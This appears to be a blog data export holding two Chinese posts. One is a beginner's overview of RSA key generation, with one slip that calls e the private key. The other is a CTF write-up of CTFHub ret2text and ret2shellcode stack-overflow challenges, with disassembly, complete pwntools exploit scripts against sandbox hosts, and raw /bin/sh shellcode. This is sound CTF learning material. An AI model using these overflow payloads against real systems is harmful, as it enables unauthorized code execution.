[{"title":"RSA学习小结（一）","url":"/2020/07/09/RSA学习小结（一）/","content":"\n这一段在做CTF时经常遇到与RSA加密有关的Crypto题，作为萌新的我一脸懵逼。所以在网上找了一些RSA的相关资料学习了一下。在此做一个简单的总结。\n\n<!-- more -->\n\n#  RSA介绍\nRSA加密算法是一种非对称加密算法，于1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。在在公开密钥加密和电子商业中RSA被广泛使用。\n\n关于对称加密和非对称加密的区别，我会继续学习，争取在下一篇博客对两者做一个介绍和区分。\n\n# RSA加密的实现\n## 加密前的准备\n假设有两个小憨憨分别是Alice和Bob。Alice要向Bod传递信息m，这里的m就是明文。为了保证他们传递的信息能够保密，需要对信息进行加密，这样即使信息被人窃听也无法知道他们传递消息的内容。聪明的Bob就想到了一个加密方法，首先他找到两个足够大的质数p，q（确实任意质数都可以，但是使用足够大的质数能确保信息难以被破解）\n 然后他计算找出一个n     <center>**n=p*q**</center>       \n                                                                         \n再计算<center>**φ(n)=(p-1)*(q-1)**</center>\n这里的φ(n)被称作欧拉函数\n接下来求e，e需要满足 **1<e<φ(n)**，且  **e与φ(n)互质**。\n这个e(encode)就是公钥，然后Bob再求出私钥d(decode)\nd满足**e*d除以φ(n)余1**, \n即 <center>**(e*d)modφ(n)=1**</center>   \n这样Alice和Bob就完成了准备工作，之后的加密通信能够实现了。\n\n## 加密的实现\n在通信前，Bob要先将计算好的公钥e和计算好的n传递给Alice，Alice利用<center>**c=m^e^ mod n**</center>      \n这样就得到密文c，然后Alice就可以将c传递给Bob，值得注意的是，上述两次信息的传递都不用防备窃听，甚至可以公开传递。\nBob拿到密文c后，就可以利用他的私钥进行解密了，解密方法如下：<center>**m=c^d^ mod n**</center> \n所以Alice和Bob就安全的传递了一次信息。\n\n# RSA的安全性\n通过上述加密过程我们可以知道，只有密文c，私钥e和n被传递。如果有人窃听到了这三个信息，为了解密他需要求出私钥d，根据d的算法，这个窃听者还要先算出φ(n)。又因为φ(n)=(p-1)*(q-1)，窃听者还需分解n，计算出p和q（窃听者：好麻烦啊，我还是算了吧）\n在上面p和q的选取时，我也提到了p和q要足够大，是因为p和q太小，n很容易被分解，举个栗子n=21，p和q分别为多少，答案很显而易见。\n在日常生活中的加密中，n常常是1024位的二进制数，分解起来比较困难（比较困难你个头啊，明明是非常困难）。再加之私钥和公钥定期都会进行更换，就更确保了RSA加密的安全性。\n\n# 写在最后\n本人也是初学者，如果文章中有错误和不足，请您尽管指出。我会在后续的学习中不断完善。感谢阅读。skr~","tags":["RSA","CRYPTO"],"categories":["学习总结"]},{"title":"CTFHub PWN刷题","url":"/2020/07/09/CTFHub-PWN刷题/","content":"\n# CTFHub PWN刷题\n\n最近在CTFHub的PWN技能树中找了两道题来学习栈溢出——ret2text和ret2shellcode\n\n这两道题出的还是很基础的，吃透栈溢出的基本概念就可以将题目解出。\n\n<!-- more -->\n\n## ret2text writeup\n\n先用checsec检查一下文件的保护类型\n\n```markdown\nArch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x400000)\n    RWX:      Has RWX segments\n```\n\n可以看出没有采取任何的栈保护\n\n再用IDA打开文件，看到函数中有system函数，搜素字符串发现secure函数中出现了`system(\"/bin/sh\")`，再看主函数的伪代码\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char v4; // [rsp+0h] [rbp-70h]\n\n  setvbuf(stdout, 0LL, 2, 0LL);\n  setvbuf(stdin, 0LL, 1, 0LL);\n  puts(\"Welcome to CTFHub ret2text.Input someting:\");\n  gets(&v4, 0LL);\n  puts(\"bye\");\n  return 0;\n}\n```\n\n可以看到`gets函数`存在明显的溢出漏洞，所以利用`gets函数`，输入足够长的字符串，达到溢出栈的目的。查看变量的位置，为 `[rbp-0x70]`。由于是64位系统，要覆盖掉ebp，就要+8字节。因此 字符串长度为  `0x70 + 8`\n\n再用反汇编查看secure函数的代码，确定system(\"/bin/sh\")的地址为`0x00000000004007b8`，即`0x4007b8`\n\n```assembly\n   0x0000000000400777 <+0>:\tpush   rbp\n   0x0000000000400778 <+1>:\tmov    rbp,rsp\n   0x000000000040077b <+4>:\tsub    rsp,0x10\n   0x000000000040077f <+8>:\tmov    edi,0x0\n   0x0000000000400784 <+13>:\tcall   0x400640 <time@plt>\n   0x0000000000400789 <+18>:\tmov    edi,eax\n   0x000000000040078b <+20>:\tcall   0x400630 <srand@plt>\n   0x0000000000400790 <+25>:\tcall   0x400680 <rand@plt>\n   0x0000000000400795 <+30>:\tmov    DWORD PTR [rbp-0x4],eax\n   0x0000000000400798 <+33>:\tlea    rax,[rbp-0x8]\n   0x000000000040079c <+37>:\tmov    rsi,rax\n   0x000000000040079f <+40>:\tlea    rdi,[rip+0x122]        # 0x4008c8\n   0x00000000004007a6 <+47>:\tmov    eax,0x0\n   0x00000000004007ab <+52>:\tcall   0x400670 <__isoc99_scanf@plt>\n   0x00000000004007b0 <+57>:\tmov    eax,DWORD PTR [rbp-0x8]\n   0x00000000004007b3 <+60>:\tcmp    DWORD PTR [rbp-0x4],eax\n   0x00000000004007b6 <+63>:\tjne    0x4007c4 <secure+77>\n   0x00000000004007b8 <+65>:\tlea    rdi,[rip+0x10c]       ; \"/bin/sh\"\n   0x00000000004007bf <+72>:\tcall   0x400620 <system@plt>\n   0x00000000004007c4 <+77>:\tnop\n   0x00000000004007c5 <+78>:\tleave  \n   0x00000000004007c6 <+79>:\tret\n```\n\n得到以上两个值之后就可以写exp了\n\n```python\nfrom pwn import *\n\nhost = 'challenge-6d9543332f6f24b5.sandbox.ctfhub.com'\nport = 33698\n\n#p = process(\"./pwn\")\np = connect(host, port)\npayload = 'A' * 0x78 + p64(0x4007b8)\np.sendline(payload)\np.interactive()\n```\n\n之后就能拿到flag了\n\n## ret2shellcode writeup\n\n使用checksec查看一下文件的保护\n\n```markdown\nArch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x400000)\n    RWX:      Has RWX segments\n```\n\n依旧没有采取任何的保护，再用IDA打开，查看文件的代码。\n\n因为函数中不包含system函数，用file查看文件时也显示使用动态链接，然而题中并未提供动态链接库，因此ret2libc的思路是行不通的，也无法使用ROP。因此采用ret2shellcode的功能\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  __int64 buf; // [rsp+0h] [rbp-10h]\n  __int64 v5; // [rsp+8h] [rbp-8h]\n\n  buf = 0LL;\n  v5 = 0LL;\n  setvbuf(_bss_start, 0LL, 1, 0LL);\n  puts(\"Welcome to CTFHub ret2shellcode!\");\n  printf(\"What is it : [%p] ?\\n\", &buf, 0LL, 0LL);\n  puts(\"Input someting : \");\n  read(0, &buf, 0x400uLL);\n  return 0;\n}\n```\n\n在伪代码  `printf(\"What is it : [%p] ?\\n\", &buf, 0LL, 0LL);`中可以看到`printf函数`会把变量`buf`的地址输出，因此可以直接读取`buf`的地址。\n\n `__int64 buf; // [rsp+0h] [rbp-10h]`可以得出`buf`对`rbp`的偏移量为`0x10`，因此我们需要溢出的空间为`16 + 8 = 24`，而偏移地址为`buf_addr+32`(32 = 24 + 8)。\n\n最后生成shellcode，shellcode可以使用pwntools中函数生成\n\n```python\nfrom pwn import *\nshellcode=asm(shellcraft.sh())\n```\n\n也可以直接使用\n\n```bash\nshellcode = \"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"\n```\n\n两个测试过都可以pwn通，根据喜好选择。\n\n之后就能构造payload\n\n```bash\n'a'*24+[buf_addr+32]+shellcode\n```\n\n然后编写完整的EXP\n\n```python\nfrom pwn import *\n\nhost = 'challenge-73515f640e7d1aa5.sandbox.ctfhub.com'\nport = 36434\n\n#p = process('./ret2shellcode')\np = connect(host,port)\np.recvuntil('[')\nbuf_addr = p.recvuntil(']', drop=True) # 获取buf地址\n# print buf_addr\np.recvuntil('Input someting : ') # 执行直到出现这句话\nshell=\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"\np.sendline('a'*24 + p64(int(buf_addr,16)+32) + shell)\np.interactive()\n```\n\n最后得到flag","tags":["PWN"],"categories":["CTF"]}]